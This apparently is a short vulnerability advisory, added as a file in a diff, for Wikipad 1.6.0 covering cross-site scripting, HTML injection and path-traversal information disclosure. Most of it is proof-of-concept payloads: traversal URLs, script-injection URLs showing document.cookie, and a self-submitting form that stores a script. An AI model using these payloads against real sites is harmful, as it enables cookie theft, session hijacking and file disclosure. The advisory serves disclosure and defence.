@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/46383/info
+
+Wikipad is prone to a cross-site scripting vulnerability, an HTML-injection vulnerability, and an information-disclosure vulnerability.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, and obtain sensitive information.
+
+Wikipad 1.6.0 is vulnerable; other versions may also be affected. 
+
+Information-disclosure:
+
+http://www.example.com/pages.php?id=./../../../../../txt_file
+
+Cross-site scripting:
+
+http://www.example.com/pages.php?id=index"><script>alert(document.cookie)</script>
+http://www.example.com/pages.php?action=edit&id=27-01-2011"><script>alert(document.cookie)</script>
+
+HTML-injection:
+
+<form action="http://host/pages.php?action=edit&id=index&title=index" method="post" name="main">
+<input type="hidden" name="data[text]" value=&#039;text"><script>alert(document.cookie)</script>&#039;>
+</form>
+
+<script>
+document.main.submit();
+</script>
